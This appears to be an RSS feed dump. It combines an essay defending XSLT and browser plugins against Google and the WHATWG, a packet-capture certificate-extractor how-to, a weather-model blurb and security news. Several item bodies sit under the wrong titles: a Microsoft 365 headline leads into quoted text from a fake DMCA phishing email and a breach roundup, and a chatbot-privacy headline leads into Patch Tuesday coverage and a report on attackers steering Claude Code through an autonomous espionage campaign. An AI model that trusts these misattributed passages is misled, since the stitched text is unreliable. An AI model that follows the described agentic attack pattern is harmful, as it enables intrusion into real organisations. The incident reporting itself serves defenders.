as neither of those companies is interested in providing a User AgentIf you have to spend any time at all to confront the Chrome push to deprecate XSLT,
your time is much better spent inventing better uses of XSLT
and reporting broken rendering if/when they start disabling it,
than caving to their destructive requests.The WHATWG is not a good steward of the open webI've mentioned it before,
but the WHATWG, even assuming the best of intentions at the time it was founded,
is not a good steward of the open web.
It is more akin to the corrupt takeover you see in regulatory capture,
except that instead of taking over the W3C
they just decided to get the ball and run with it,
taking advantage of the fact that, as implementors,
they had the final say on what counted as “standard”
( if not ):
exactly the same attitude with which Microsoft tried taking over the web
through Internet Explorer at the time of the First browser war,
an attitude that was rightly condemned at the time
—even as many of those who did, have so far failed to acknowledge the problem
with Google's no less detrimental approach.The key point here is that,
whatever the WHATWG was (or was intended to be)
when it was founded by Opera and Mozilla developers,
it is now manifestly a corporate monster.
Their corporate stakeholder have a very different vision of what the Web should be
compared to the vision on which the Web was founded, the vision promoted by the W3C,
and the vision that underlies a truly open and independent web.The WHATWG aim is to turn the Web into an application delivery platform,
a profit-making machine for corporations where the computer
(and the browser through it)
are a means for  to make money off 
rather than for  to gain access to services you may be interested in.
Because of this, the browser in their vision is not a User Agent anymore,
but a tool that sacrifices privacy, actual security and user control
at the behest of the corporations “on the other side of the wire”
—and of their political interests
(refs. for Apple, Google,
and a more recent list with all of them together).Such vision is in direct contrast with that of the Web as a
, a vast vault of interconnected 
whose value emerges from organic connections, personalization,
variety, curation and .
But who in the WHATWG today would defend such vision?Maybe what we need is a new browser war.
Not one of corporation versus corporation
—doubly more so when all currently involved parties are allied
in their efforts to enclose the Web than in fostering an open and independent one—
but one of users versus corporations,
a war to take  control of the Web and its tools.It's kind of ironic that in a time when  has become almost trivial,
the fight we're going to have to fight is going to be on the  side.
But the biggest question is: who do we have as champions on our side?I would have liked to see browsers like Vivaldi,
the spiritual successor to my beloved classic Opera browser,
amongst our ranks,
but with their dependency on the Blink rendering engine, controlled by Google,
they won't be able to do anything but cave,
as will all other FLOSS browsers relying on Google's or Apple's engines,
none of which I foresee spending any significant efforts rolling back the extensive changes that these deprecations will involve.
(We see this already when it comes to JPEG XL support,
but it's also true that e.g. Vivaldi has made RSS feeds first-class documents,
so who knows, maybe they'll find a way for XSLT through the polyfill that was mentioned above,
or something like that?)Who else is there?
There is Servo, the rendering engine that was being developed at Mozilla to replace Gecko,
and that turned into an independent project when its team was fired in 2020;
but they don't support XSLT yet,
and I don't see why they would prioritize its implementation over, say, stuff like MathML or SVG animations with SMIL
(just to name two of my pet peeves), or optimizing browsing speed
(seriously, try opening the home page of this site and scrolling through).What we're left with at the moment is basically just Firefox forks,
and two of these (LibreWolf and WaterFox)
are basically just “Firefox without the most egregious privacy-invasive misfeatures”,
which leaves the question open about what they will be willing to do when Mozilla helps Google kill XSLT,
and only the other one, Pale Moon, has grown into its own independent fork
(since such an old version of Firefox, in fact, that it doesn't support WebExtensions-based plugins,
such as the most recent versions of crucial plugins like uBlock Origin or Privacy Badger,
although it's possible to install community-supported forks of these plugins designed
for legacy versions of Firefox and forks like Pale Moon).(Yes, I am aware that there are other minor independent browser projects,
like Dillo and Ladybird,
but the former is in no shape of being a serious contender for general use
on more sophisticated pages —just see it in action on this site, as always—
and the latter is not even in alpha phase,
just in case the questionable “no politics” policies
—which consistently prove to be weasel words for “we're right-wingers but too chicken to come out as such”—
weren't enough to stay away from it.)Periodically, I go through them (the Firefox forks, that is) to check if they are good enough for me to become my daily drivers.
Just for you (not really: just for me, actually), I just tested them again.
They're not ready yet, at least not for me, although I must say that I'm seeing clear improvements since my last foray into the matter,
that wasn't even that long ago.
In some cases, I can attest that they are even better than Firefox:
for example, Pale Moon and WaterFox have good JPEG XL support
(including transparency and animation support,
which break in LibreWolf as they do in the latest nightly version of Firefox I tried),
and Pale Moon still has first-class support for RSS,
from address bar indicator to rendering even in the absence of a stylesheet
(be it CSS or XSLT).An interesting difference is that the user interface of these browsers is perceivably less refined than Firefox'.
It's a bit surprising, given the common roots,
but it emerges in several more and less apparent details,
from the spacing between menu items to overlapping text and icons in context menus,
passing through incomplete support for dark themes and other little details that all add up,
giving these otherwise quite valid browsers and amateurish feeling.And I get it: UI design is hard, and I myself suck at it, so I'm the last person that should be giving recommendations,
but I'm still able to differentiate between more curated interfaces and ones that need some work;
and if even someone like me who distinctly prefers function over form finds these little details annoying,
I can imagine how much worse this may feel to users who care less about the former and more about the latter.
Sadly, if a new browser war is to be fought to wrestle control from the corporate-controlled WHATWG,
.In the end, I find myself in a “waiting” position.
How long will it take for Firefox to kill their XSLT support?
What will its closest forks
(WaterFox in particular is the one I'm eyeing)
be able to do about it?
Or will Pale Moon remain the only modern broser with support for it,
as a hard fork that has since long gone its own way?
Will they have matured enough to become my primary browsers?
We'll see in time.There's more to the Internet than the World Wide Web built around the HTTP protocol and the HTML file format.
There used to be  of the Internet beyond the Web,
and while much of it still remains as little more than a shadow of the past,
largely eclipsed by the Web and what has been built on top of it
(not all of it good) outside of some modest revivals,
there's also new parts of it that have tried to learn from the past,
and build towards something different.This is the case for example of the so-called “Gemini Space”,
a small corner of the Internet that has nothing to do with the LLM Google is trying to shove down everyone's throat,
and in fact not only predates it, as I've mentioned already,
but is intentionally built around dfferent technology to  from the influence of Google and the like.The Gemini protocol is designed to be conceptually simpler than HTTP,
while providing modern features like built-in transport-level security
and certificate-based client-side authentication,
and its own “native” document format, the so-called gemtext.
There's something to be said about not wanting to share your environment with the poison that a large part of the web has become,
but at the same time, there's also something to be said about throwing away the baby with the bathwater.
The problem with the web isn't technical, it's social. The tech itself is fine.
I'm not going to sing the praises of the Gemini protocol or gemtext either,
even though I do like the idea of a web built on lightweight markup formats:
I would love it if browsers had native support for formats like
Markdown or AsciiDoc (and gemtext, for the matter):
it's why I keep the AsciiDoctor Browser Extension installed.But more in general, the Web (or at least its user agents) should not differentiate.
It should not differentiate by protocol, and it should not differentiate by format.
We've seen it with image formats like MNG being unfairly excluded,
with [motivations based on alleged code bloat][nomng] that today are manifest in their idiocy
(and yes, it hasn't escaped my that even Pale Moon doesn't support the format),
and we're seeing it today with JPEG XL threatened with a similar fate,
without even gracing us with a ridiculous excuse.
On the upside, we have browsers shipping with a full-fledged PDF reader,
which is a good step towards the integration of this format with the greater Web.In an ideal world, browsers would have not deprecated older protocols
like Gopher or FTP,
and would just add support for new ones like Gemini,
as they would have introduced support for new (open) document formats as they came along.A Web of interconnected software?It shouldn't be up to the User Agent to determine which formats the user is able to access, and through which protocol.
(If I had any artistic prowess (and willpower), I'd hack the “myth of consensual X” meme
representing the user and the server saying “I consent”, and the browser saying “I don't”.)
I do appreciate that there is a non-trivial maintenance cost that grows with the number of formats and protocols,
but we know from classic Opera that it is indeed quite possible
to ship a full Internet suite in a browser packaging.In the old days, browser developers were well-aware that a single vendor couldn't “cover all bases”,
which is how interfaces like the once ubiquituous NPAPI were born.
The plug-in interface has been since removed from most browsers,
an initiative again promoted by Google, announced in 2013 and completed in 2015
(I should really add this to my previous post on Google killing the open web,
but I also really don't feel like touching that anymore; here will have to suffice),
with the other major browsers quickly following suit,
and its support is now relegated only to independent browsers like Pale Moon.And even if it can be argued that the NPAPI specifically was indeed mired with unfixable security and portability issues and it had to go,
its removal without a clear cross-browser upgrade path has been ,
destroying the primary “escape hatch” to solve the chicken-and-egg problem of client-side format support versus server-side format adoption.
By the way, it was also responsible for the biggest W3C blunder,
the standardization of  for the web through the so-called
Encrypted Media Extensions, a betrayal of the W3C own mission statement.The timeline here is quite interesting, and correlates with the already briefly mentioned history of Flash,
and its short-lived Microsoft Silverlight competitor, that were largely responsible for
the early expansive growth of multimedia streaming services in the early years of the XXI century:
with the tension between Apple's effort to kill Flash
and the need of emerging streaming services like Netflix' and Hulu's
to support in-browser multimedia streaming,
there was a need to improve support for multimedia formats in the nascent HTML5 specification,
but also a requirement from the  partners
that such a support would allow enforcing the necessary restrictions that would, among other things, prevent users from saving a local copy of the stream,
something that could be more easily enforced within the Flash players the industries had control over
than in a  controlled by .This is where the development of  came in in 2013:
this finally allowed a relatively quick phasing out of the Flash plugin,
and  of the plugin interface that allowed its integration with the browsers:
by that time, the Flash plugin was by and large  plugin the API existed for,
and the plugin itself was indeed still supported by the browsers for some time after support for the API was otherwise discontinued
(sometimes through alternative interfaces such as the PPAPI,
other times by keeping the NPAPI support around, but only enabled for the Flash plugin).There are several interesting consideration that emerge from this little glimpse at the history of Flash and the EME.First of all,
this is one more piece of history that goes to show how pivotal the year 2013 was for the enshittification of the World Wide Web,
as discussed already.Secondly,
it shows how the developers of major browsers are more than willing to provide a smooth transition path with no user intervention,
at least when catering to the interests of major industries.
This indicates that when they don't, it's not because they :
it's because they have a vested interest in not doing it.
Major browser development is now (and has been for over a decade at least)
beholden not to the needs and wants of ,
but to those of other industries.
But I repeat myself.And thirdly, it's an excellent example, for the good and the bad, of how the plugin interface has helped drive the evolution of the web,
as I was saying.The removal of NPAPI support,
followed a few years later by the removal of the (largely Chrome-specific) PPAPI interface
(that was supposed to be the “safer, more portable” evolution of NPAPI),
without providing  alternative,
is a very strong indication of the path that browser development has taken in the last “decade plus”:
a path where the Web is entirely controlled by what Google, Apple and Microsoft
(hey look, it's GAFAM all over again!) decide about what is allowed on it,
and what is  allowed to  be on it (to wit, ads and other user tracking implements).With plugins,  could be integrated in the World Wide Web,
and such integration would be close to as efficient as could be.
Without plugins, such integration, when possible at all,
becomes clumsier and more expensive.As an example, there are browser extensions that can introduce support for JPEG XL to browsers that don't have native support.
This provides a workaround to display such images in said browsers,
but when a picture with multiple formats is offered
(which is what I do e.g. to provide a PNG fallback for the JXL images I provide),
this results in  the PNG  JXL formats being downloaded,
 the amount of data transferred instead of decreasing it
(one of the many benefits of JXL over PNG).
By contrast, a plugin could register itself a handler for the JPEG XL format,
and the browser would then be able to delegate rendering of the image to the plugin,
only falling back to the PNG in case of failure,
thus maximizing the usefulness of the format pending a built-in implementation.The poster child of this lack of efficiency is arguably MathJax,
that has been carrying for nearly two decades the burden of bringing math to the web while browser implementors slacked off on their MathML support.
And while MathJax  offer more than just MathML support for browers without native implementations,
there is little doubt that it would be more effective in delivering the services it delivers
if it could be a plugin rather than a multi-megabyte
(any efforts to minimize its size notwithstanding)
JavaScript library each math-oriented website needs to load.(In fact, it is somewhat surprising that there isn't a browser extesion version of MathJax that I can find
other than a GreaseMonkeyuser script with convoluted usage requirements,
but I guess this is the cost we have to pay for the library flexibility,
and the sandboxing requirements enforced on JavaScript in modern browsers.)Since apparently “defensive writing” is a thing we need when jotting down an article such as this
(as if it even matters, given how little attention people give to what they read —if they read it at all— before commenting),
I should clarify that I'm not necessarily for a return to NPAPI advocating.
We have decades of experience about what could be considered the actual technical issues with that interface,
and how they can be improved upon
(which is for example what PPAPI allegedly did,
before Google decided it would be better off to kill plugins entirely
and thus gain full control of the Web as a platform),
as we do about sandboxing external code running in browsers
(largely through the efforts to sandbox JavaScript).
A better plugin API could be designed.It's not going to happen.
It is now apparent that the major browsers explicitly and intentionally do not want to allow the kind of flexibility that plugins would allow,
hiding their controlling efforts behind security excuses.
It would thus be up to the minority browsers to come up with such an interface
(or actually multiple ones, at least one for protocols and one for document types),
but with most of them beholden to the rendering engines controlled by Google
(for the most part), Apple (some, still using WebKit over Blink), and Mozilla (the few Firefox forks),
they are left with very little leeway, if any at all, in terms of what they can support.But even if, by some miraculous convergence, they did manage to agree on and implement support for such an API,
would there actually be an interest by third party to develop plugins for it?
I can envision this as a way for browsers to share coding efforts in supporting new protocols and formats before integrating them as first-class
(for example, the already mentioned Gemini protocol and gemtext format could be implemented first as a plugin
to the benefit of any browsers supporting such hypothetical interfaces)
but there be any interest in developing for it, rather tha just trying to get the feature implemented in the browsers themselves?A mesh of building blocksStill, let me dream a bit of something like this,
a browser made up of composable components,
protocol handlers separate from primary document renderers separate from attachment handlers.Implement a plugin to handle that, and you can test it by delivering the same content over it,
and see it rendered just the same from the other components in the chain.Implement a plugin to handle that, and it will be used to render documents in the new format.Implement a plugin to handle that, and any image in the new format will be visible.You guessed it: implement a plugin to handle that …How much tech would have had a real chance at proving itself in the field if this had been the case,
or would have survived being ousted not by technical limitations,
but by unfriendly corporate control?
Who knows, maybe
RSS and Atom integration would still be trivially at everybody's hand;
nobody would have had to fight with the long-standing bugs in PNG rendering from Internet Explorer,
MNG would have flourished, JPEG XL would have become ubiquituous six months after the specification had been finalized;
we would have seen HTML+SMIL provide declarative interactive documents without JavaScript as far back as 2008;
XSLT 2 and 3 would have long superseded XSLT 1 as  templating languages for the web,
or XSLT would have been supplanted by the considerably more accessible XQuery;
XHTML2 would have lived and grown alongside HTML5,
offering more sensible markup for many common features,
and much-wanted capabilities such as client-side includes.The web would have been very different from what it is today,
and most importantly we would never would have had to worry
about a single corporation getting to dictate what is and what isn't allowed on the Web.But the reality is much harsher and darker.
Google has control, and we do need to wrestle it out of their hands.So, do not comply.
Resist.
Force the unwanted tech through.
Use RSS.
Adopt JPEG XL as your primary image format.
And report newly broken sites for what they are:
a browser fault, not a content issue.I would like to add here any  for XSLT.xslt.rip (best viewed with a browser that supports XSLT; viewing the source is highly recommended);and last but not least (yeah I know, doesn't make much sense with the current short list, but still),
a shameless plug of my own website, of course,
because of the idea to use XSLT not to produce HTML, but to produce SVG.Made the news (and other related articles)I've apparently “made the news” (again).I have read the comments, and little has changed since last time.
The only comment worth responding is from the user that prefers EME to the mess of plugins we used to have.
I understand where they are coming from, but I disagree on a matter of principle:
DRM shouldn't exist, and it should never have been standardized in violation of the W3C mission statement;
as a plus, and the more cumbersome it is for the user, the better it represents its negative nature.Aside from that, the comments keep missing the point,
and weight their personal dislike for XSLT more than the important role it plays on the open and indie web.
Just seeing how many people follow the corporate recommendation to apply it server-side and distribute the
“rendered” HTML shows these are people who have no idea what they're talking about:
just as an example,
my sparklines are still 10× smaller as XML data plus XSLT than as the rendered SVG,
with benefits amortizing over multiple sparklines per page
(due to common XSLT), and over time
(data changes, XSLT does not; also, the actual ratio of SVG to XML data is much higher that 10×,
and as data increases, the ratio tends to ).
For smaller, cheaper and/or home hosting, XSLT remains a clear winner.You don't like the syntax? Fine.
But use that energy to pressure for XQuery to be available
instead of towing the corporate line about the demise of XSLT.]]></content:encoded></item><item><title>PacketSmith X.509 Certificate Extractor (TLS over TCP and DTLS) - How To</title><link>https://packetsmith.ca/certificate_extractor/</link><author>/u/MFMokbel</author><category>netsec</category><pubDate>Mon, 17 Nov 2025 15:22:43 +0000</pubDate><source url="https://www.reddit.com/r/netsec/top/?t=week">Reddit - NetSec</source><content:encoded><![CDATA[Release 4.0 introduces a new capability: the scanning of TCP and UDP streams for x.509 certificates. You can now either export these certificates to disk or dissect their attributes and output them as JSON objects and arrays. It checks for certificates in all the streams that start with a TLS Handshake content type, and for handshakes of type Certificate. s. For the TCP protocol, the  is invoked to reconstruct valid streams. The scanning process against the TCP and UDP protocols is port-independent.The process of locating X.509 certificates in a pcap is not as simple as scanning the entire pcap payload or a packet for specific certificate constants and extracting them. On the contrary, the identification of such a certificate follows a strict set of rules for the TCP and UDP protocols.For the TCP protocol, and because of MTU limitations, with the possibility that a certificate might span more than one packet, TCP stream calculation becomes a necessity. And, working with TCP streams is not enough, because of packet retransmission, out-of-order packets, and other similar network behaviour. The latter necessitates the implementation of a TCP reassembly engine to handle such types of network behaviour, which is not an easy task.Once you have all the essential building blocks implemented up to the network layer, working with reassembled TCP streams and searching for certificates is another subtle task. This requires searching in an optimized fashion, all streams that start with a TLS/SSL Handshake (0x16) content type, containing handshakes of type Certificate (0x0b). From this point on, we extract the Certificate record layer certificate header to extract all certificates.For UDP and in case of handshake fragmentation, the TLS protocol uses fragments with sequence number, offset and length fields; consequently, those fragments have to be reassembled at the UDP stream level before scanning for certificates.We implemented a custom ASN.1 DER certificate parser to handle the parsing and validation of the acquired certificates. This tool dissects all certificate attributes, including various extensions. The extracted data is then exported as a detailed, organized, and hierarchical JSON array for both TCP and UDP streams. The extractor is highly reliable, making it unlikely to produce false positives (treating an invalid certificate as valid) or false negatives (missing a valid certificate).The TCP reassembly engine can be turned off and instead switch to payload concatenation of all packets in the stream. Based on our testing, the difference in performance for large pcaps is considerable. Moreover, even the stream’s directionality can be specified in the configuration file, up (c->s), down (s->c) or duplex (c< – >s).To demonstrate the performance difference, take the following pcap  (fsize: 55.5 MB; sha-1: 5b822dc38f8b97f0b966bce4601cf73cb40afbd1) as an example. According to PacketSmith’s calculation, it consists of 15227 streams, with 12469 being TCP-IPv4 and 2758 being UDP-IPv4. A total of 129 X.509 certificates are located exclusively in the TCP-IPv4 streams.With the TCP reassembly engine on, it takes about 7860_ms to dump all the certificates to a folder on disk, and around 5370_ms with the TCP reassembly engine off; A performance improvement of ~32%.The automated search, location, extraction, and subsequent dissection of X.509 certificates within packet captures is a fundamental requirement for creating fine-grained Intrusion Prevention/Detection System (IPS/IDS) rules. These policies leverage various certificate attributes, a methodology further explored in our research paper, . This is why we add additional metadata to every dissected certificate in the JSON object, such as the entropy, fingerprints against the certificate payload and the public key, and field-level dissection of the subject and issuer attributes.Let’s take the TLS over TCP traffic  (fsize: 2499 bytes) generated by  (Adversary Emulation Framework) as an example. The pcap consists of one TCP stream over TLS v1.2, with 20 packets in total.To extract all the certificates from the pcap, we execute the following PacketSmith cmd line option:Using the option , the above command will export all found certificates to the folder/Output path “C:\Users\PS\Desktop\certs”, under the filename with the format pattern:The metadata in the filename is specific to the stream id where the certificate is found. For example,And the output message you get from PacketSmith once the above command is successfully executed is the following:- a total of 1 x.509 DER certificate was dumped to C:\Users\PS\Desktop\certs– TCP-IPv4 -> 1– TCP-IPv6 -> 0– UDP-IPv6 -> 0To dump the JSON dissection of the certificate to the console, we use a similar command:Which outputs a JSON object similar to this:]]></content:encoded></item><item><title>WeatherNext 2: Our most advanced weather forecasting model</title><link>https://blog.google/technology/google-deepmind/weathernext-2/</link><author>meetpateltech</author><category>dev</category><pubDate>Mon, 17 Nov 2025 15:04:26 +0000</pubDate><source url="https://news.ycombinator.com/best">Best of HackerNews</source><content:encoded><![CDATA[Weather predictions need to capture the full range of possibilities — including worst case scenarios, which are the most important to plan for.WeatherNext 2 can predict hundreds of possible weather outcomes from a single starting point. Each prediction takes less than a minute on a single TPU; it would take hours on a supercomputer using physics-based models.Our model is also highly skillful and capable of higher-resolution predictions, down to the hour. Overall, WeatherNext 2 surpasses our previous state-of-the-art WeatherNext model on 99.9% of variables (e.g. temperature, wind, humidity) and lead times (0-15 days), enabling more useful and accurate forecasts.This improved performance is enabled by a new AI modelling approach called a Functional Generative Network (FGN), which injects ‘noise’ directly into the model architecture so the forecasts it generates remain physically realistic and interconnected.This approach is particularly useful for predicting what meteorologists refer to as “marginals” and “joints.” Marginals are individual, standalone weather elements: the precise temperature at a specific location, the wind speed at a certain altitude or the humidity. What's novel about our approach is that the model is only trained on these marginals. Yet, from that training, it learns to skillfully forecast 'joints' — large, complex, interconnected systems that depend on how all those individual pieces fit together. This 'joint' forecasting is required for our most useful predictions, such as identifying entire regions affected by high heat, or expected power output across a wind farm.]]></content:encoded></item><item><title>Microsoft: Windows bug blocks Microsoft 365 desktop app installs</title><link>https://www.bleepingcomputer.com/news/microsoft/microsoft-windows-bug-blocks-microsoft-365-desktop-app-installs/</link><author>Sergiu Gatlan</author><category>security</category><pubDate>Mon, 17 Nov 2025 14:54:31 +0000</pubDate><source url="https://www.bleepingcomputer.com/">BleepingComputer</source><content:encoded><![CDATA[​Microsoft is working to resolve a known issue preventing users from installing the Microsoft 365 desktop apps on Windows devices.

DMCA (Digital Millennium Copyright Act) notices are legal requests about copyrighted content, so it makes sense that many users would worry they broke the rules and feel eager to read the warning.“Some recent activity on your page may not fully meet our community standards. Please take a moment to review the information below and ensure your shared content follow our usage rules.Notice Date : {day received}”Kindly review the material You’ve shared.If you think this notice was sent in error, you can request a check using the link below.If no update is received within 24 hours, your page visibility may stay temporarily limited until the review is complete.We thank you for your attention and cooperation in keeping this space respectful and positive for all.”As usual, the scammers add some extra pressure by claiming your account may be hidden or limited if you don’t act within 24 hours.But the “Review Details” button doesn’t lead to anything on X. It does look a lot like the X login page, but it’s fake.Any username and password typed there go straight to the hackers—which could leave you with a compromised account.How to keep your X account safeHaving your X account stolen can be a major pain for you, your followers, and your reputation (especially if you’re in the cybersecurity field). So here are some tips to keep it safe:Make sure 2FA is turned on. We wrote an article about how to do this back when it was still called Twitter.When entering a username and password, or any type of sensitive information, check whether the URL in the address bar matches what you expect.Don’t click on links in unsolicited emails and check with the sender through another channel first. A real DMCA notice from X will include a full copy of the reporter’s complaint, including contact details, plus instructions for filing a counter-notice.Pro tip: You can upload suspicious messages of any kind to Malwarebytes Scam Guard. It will tell you whether it’s likely to be a scam and advise you what to do.If you suspect your account may be compromised:Make sure your email account associated with the account is secure.Revoke connections to third-party applications.Update your password in the third-party applications that you trust.Contact Support if you can’t log in after trying the above.Here are the full instructions from X for users who believe their accounts have been compromised.We don’t just report on scams—we help detect themCybersecurity risks should never spread beyond a headline. If something looks dodgy to you, check if it’s a scam using Malwarebytes Scam Guard, a feature of our mobile protection products. Submit a screenshot, paste suspicious content, or share a text or phone number, and we’ll tell you if it’s a scam or legit.

There are new confirmed breaches at The Washington Post, Logitech, Allianz UK, and GlobalLogic, as well as a newly listed but unconfirmed breach involving the British National Health Service (NHS). The group has leaked data sets ranging from gigabytes to terabytes and is sending extortion emails to Oracle EBS customers. Oracle has issued emergency patches, but investigations indicate exploitation began months before disclosure.Check Point IPS provides protection against this threat (Oracle Concurrent Processing Remote Code Execution)Payment processor Checkout.com has discloseda data breach by the ShinyHunters threat group. Attackers accessed documents from a legacy cloud storage system that wasn’t properly decommissioned, potentially affecting about 25% of current merchants. That being said, no payment card numbers or funds were compromised. The company is notifying impacted parties and regulators.DoorDash, a food delivery company, has confirmeda data breach after an employee fell victim to a social engineering scam. Contact details including names, physical addresses, email addresses, and phone numbers were accessed across the US, Canada, Australia, and New Zealand.Ransomware group dubbed “J Group” claims to have breached Australian engineering firm IKAD. The group has reportedly exfiltrated 800GB of data by exploiting a VPN flaw and maintaining undetected access for five months. IKAD confirmed a cyber incident and the theft of non-sensitive contract and HR information, while denying exposure of classified defence data.Pro-Russian group NoName057(16) launched DDoS attacks disrupting Danish government, municipal, and defense-related websites, including the Ministry of Transport, Borger.dk, and Terma. The outages were brief with no data loss, and the activity aligns with wider pro-Russia targeting of European institutions.Port Alliance, a Russian port operator handling coal and fertilizer exports, has reportedthree days of cyberattacks combining DDoS and attempted network intrusions. Terminals remain operational, but digital services were disrupted by a botnet of more than 15,000 rotated IP addresses. The goal of the attack was to destabilize operations and disrupt business processes.Princeton University disclosed a breach of its Advancement database on November 10, lasting less than 24 hours before attackers were removed. The compromised database contained names, contact information, and fundraising records for alumni, donors, faculty, students, and parents, but did not include Social Security numbers, passwords, or financial information.VULNERABILITIES AND PATCHESMicrosoft’s October Patch Tuesday Microsoft addressed63 vulnerabilities, including an actively exploited Windows zero-day, CVE-2025-62215, a kernel privilege escalation flaw used to gain admin access. It also addressed CVE-2025-60724, a critical GDI+ vulnerability rated 9.8 enabling remote code execution via malicious documents or uploaded files, impacting Windows and Office.Check Point IPS provides protection against this threat (Microsoft Windows Kernel Privilege Escalation (CVE-2025-62215))Researchers uncoveredCVE-2025-20337 and CVE-2025-5777, critical zero-day flaws in Cisco Identity Service Engine and Citrix products actively exploited against internet-facing systems. The flaws enable remote code execution without login, administrator access, and deployment of custom in-memory webshells. The exploitation began before disclosure or complete patches.Check Point IPS provides protection against these threats (Cisco Identity Services Engine Remote Code Execution (CVE-2025-20337), Citrix NetScaler Out-of-Bounds Read (CVE-2025-5777))Researchers analyzedCVE-2025-12480, a critical authentication bypass in the Triofox enterprise file sharing platform (CVSS 9.1).

Qilin led activity while LockBit 5.0 returned, signaling potential recentralization. Manufacturing and business services remained the most affected sectors.Check Point Research published its October 2025 global threat report, highlighting a continued rise in cyberattacks, with organizations averaging 1,938 weekly attacks (+5% YoY) and ransomware incidents surging 48% YoY. The report also notes escalating GenAI-related data leakage risks, with 1 in 44 enterprise prompts exposing sensitive information.Check Point researchers analyzed a phishing campaign abusing Meta’s Facebook Business Suite and the facebookmail.com domain to deliver convincing fake notifications. More than 40,000 emails targeted over 5,000 organizations across the US, Europe, Canada, and Australia, targeting SMBs in advertising-reliant sectors, bypassing filters, and directing victims to credential-harvesting sites.Check Point researchers profiledthe Payroll Pirates, a malvertising network impersonating payroll systems, credit unions, and trading platforms in the US. Using Google and Microsoft ads, cloaking, and Telegram bots to bypass authentication codes, it has targeted over 200 interfaces and lured more than 500,000 users, with activity spiking in September 2025.]]></content:encoded></item><item><title>Giving C a superpower: custom header file (safe_c.h)</title><link>https://hwisnu.bearblog.dev/giving-c-a-superpower-custom-header-file-safe_ch/</link><author>mithcs</author><category>dev</category><pubDate>Mon, 17 Nov 2025 10:40:55 +0000</pubDate><source url="https://news.ycombinator.com/best">Best of HackerNews</source><content:encoded><![CDATA[]]></content:encoded></item><item><title>What if your romantic AI chatbot can’t keep a secret?</title><link>https://www.welivesecurity.com/en/privacy/romantic-ai-chatbot-keep-secret/</link><author></author><category>threatintel</category><pubDate>Mon, 17 Nov 2025 10:00:00 +0000</pubDate><source url="https://www.welivesecurity.com/">ESET WeLiveSecurity</source><content:encoded><![CDATA[Does your chatbot know too much?

Microsoft also fixed a glitch that prevented some  users from taking advantage of an extra year of security updates, which is nice because the zero-day flaw and other critical weaknesses affect all versions of Windows, including Windows 10.Affected products this month include the Windows OS, , , , , , and . The zero-day threat concerns a memory corruption bug deep in the Windows innards called CVE-2025-62215. Despite the flaw’s zero-day status, Microsoft has assigned it an “important” rating rather than critical, because exploiting it requires an attacker to already have access to the target’s device.“These types of vulnerabilities are often exploited as part of a more complex attack chain,” said , dean of research for the SANS Technology Institute. “However, exploiting this specific vulnerability is likely to be relatively straightforward, given the existence of prior similar vulnerabilities.”, lead cybersecurity engineer at , called attention to CVE-2025-60274, a critical weakness in a core Windows graphic component (GDI+) that is used by a massive number of applications, including Microsoft Office, web servers processing images, and countless third-party applications.“The patch for this should be an organization’s highest priority,” McCarthy said. “While Microsoft assesses this as ‘Exploitation Less Likely,’ a 9.8-rated flaw in a ubiquitous library like GDI+ is a critical risk.”Microsoft patched a critical bug in  — CVE-2025-62199 — that can lead to remote code execution on a Windows system. , CEO and co-founder of , said this Office flaw is a high priority because it is low complexity, needs no privileges, and can be exploited just by viewing a booby-trapped message in the Preview Pane.Many of the more concerning bugs addressed by Microsoft this month affect Windows 10, an operating system that Microsoft officially ceased supporting with patches last month. As that deadline rolled around, however, Microsoft began offering Windows 10 users an extra year of free updates, so long as they register their PC to an active Microsoft account.Judging from the comments on last month’s Patch Tuesday post, that registration worked for a lot of Windows 10 users, but some readers reported the option for an extra year of updates was never offered. , cyber incident response manager at , notes that Microsoft has recently released an out-of-band update to address issues when trying to enroll in the Windows 10 Consumer Extended Security Update program.“If you plan to participate in the program, make sure you update and install KB5071959 to address the enrollment issues,” Carroll said. “After that is installed, users should be able to install other updates such as today’s KB5068781 which is the latest update to Windows 10.” at notes that in addition to Microsoft updates today, third-party updates from  and  have already been released. Also, an update for  is expected soon, which means  will also be in need of its own update.The SANS Internet Storm Center has a clickable breakdown of each individual fix from Microsoft, indexed by severity and CVSS score. Enterprise Windows admins involved in testing patches before rolling them out should keep an eye on askwoody.com, which often has the skinny on any updates gone awry.As always, please don’t neglect to back up your data (if not your entire system) at regular intervals, and feel free to sound off in the comments if you experience problems installing any of these fixes.[Author’s note: This post was intended to appear on the homepage on Tuesday, Nov. 11.

This was based on systematic evaluations showing cyber capabilities doubling in six months; we’d also been tracking real-world cyberattacks, observing how malicious actors were using AI capabilities. While we predicted these capabilities would continue to evolve, what has stood out to us is how quickly they have done so at scale.In mid-September 2025, we detected suspicious activity that later investigation determined to be a highly sophisticated espionage campaign. The attackers used AI’s “agentic” capabilities to an unprecedented degree—using AI not just as an advisor, but to execute the cyberattacks themselves.The threat actor—whom we assess with high confidence was a Chinese state-sponsored group—manipulated our Claude Code tool into attempting infiltration into roughly thirty global targets and succeeded in a small number of cases. The operation targeted large tech companies, financial institutions, chemical manufacturing companies, and government agencies. We believe this is the first documented case of a large-scale cyberattack executed without substantial human intervention.Upon detecting this activity, we immediately launched an investigation to understand its scope and nature. Over the following ten days, as we mapped the severity and full extent of the operation, we banned accounts as they were identified, notified affected entities as appropriate, and coordinated with authorities as we gathered actionable intelligence.This campaign has substantial implications for cybersecurity in the age of AI “agents”—systems that can be run autonomously for long periods of time and that complete complex tasks largely independent of human intervention. Agents are valuable for everyday work and productivity—but in the wrong hands, they can substantially increase the viability of large-scale cyberattacks.These attacks are likely to only grow in their effectiveness. To keep pace with this rapidly-advancing threat, we’ve expanded our detection capabilities and developed better classifiers to flag malicious activity. We’re continually working on new methods of investigating and detecting large-scale, distributed attacks like this one.In the meantime, we’re sharing this case publicly, to help those in industry, government, and the wider research community strengthen their own cyber defenses. We’ll continue to release reports like this regularly, and be transparent about the threats we find.How the cyberattack workedThe attack relied on several features of AI models that did not exist, or were in much more nascent form, just a year ago: Models’ general levels of capability have increased to the point that they can follow complex instructions and understand context in ways that make very sophisticated tasks possible. Not only that, but several of their well-developed specific skills—in particular, software coding—lend themselves to being used in cyberattacks.. Models can act as agents—that is, they can run in loops where they take autonomous actions, chain together tasks, and make decisions with only minimal, occasional human input.. Models have access to a wide array of software tools (often via the open standard Model Context Protocol). They can now search the web, retrieve data, and perform many other actions that were previously the sole domain of human operators. In the case of cyberattacks, the tools might include password crackers, network scanners, and other security-related software.The diagram below shows the different phases of the attack, each of which required all three of the above developments:In Phase 1, the human operators chose the relevant targets (for example, the company or government agency to be infiltrated). They then developed an attack framework—a system built to autonomously compromise a chosen target with little human involvement. This framework used Claude Code as an automated tool to carry out 